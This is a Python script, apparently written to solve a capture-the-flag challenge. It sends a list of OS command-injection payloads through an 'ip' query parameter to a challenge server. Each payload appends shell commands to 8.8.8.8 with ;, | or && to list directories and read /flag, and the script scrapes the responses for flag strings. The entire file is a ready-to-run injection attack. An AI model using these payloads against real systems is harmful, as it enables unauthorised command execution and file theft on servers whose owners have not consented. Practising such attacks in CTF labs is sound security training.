# -*- coding: utf-8 -*-
import urllib.request, urllib.parse

url = 'http://80-d92fbb9d-0480-4a13-afc2-047c2ac7a6cd.challenge.ctfplus.cn'

# Test the RCE injection directly
payloads = [
    '8.8.8.8;cat /flag',
    '8.8.8.8|cat /flag',
    '8.8.8.8&&cat /flag',
    '8.8.8.8;cat /fla*',
    '8.8.8.8;tac /flag',
    '8.8.8.8;nl /flag',
    '8.8.8.8;head /flag',
    '8.8.8.8;cat flag',
    '8.8.8.8;cat /flag.txt',
    '8.8.8.8;ls /',
    '8.8.8.8;ls',
    '8.8.8.8;find / -name flag* 2>/dev/null',
]

for p in payloads:
    try:
        data = urllib.parse.urlencode({'ip': p})
        full = url + '?' + data
        req = urllib.request.Request(full, headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=8)
        body = resp.read().decode('utf-8', errors='replace')
        # Look for flag patterns in response
        import re
        flags = re.findall(r'flag\{[^}]+\}|CTF\{[^}]+\}|ISCC\{[^}]+\}|Geesec\{[^}]+\}|DASCTF\{[^}]+\}', body)
        if flags:
            print(f"FOUND FLAG: {flags[0]}  (payload: {p})")
        else:
            # Check if response is small (got a result back but no flag found)
            # Remove HTML to see actual output
            text = re.sub(r'<[^>]+>', '', body)
            import html
            text = html.unescape(text)
            # Show first 200 chars
            clean = text.strip()[:200]
            print(f"[{p[:20]}...] -> {clean[:100]}")
    except Exception as e:
        print(f"[{p[:20]}...] ERROR: {e}")
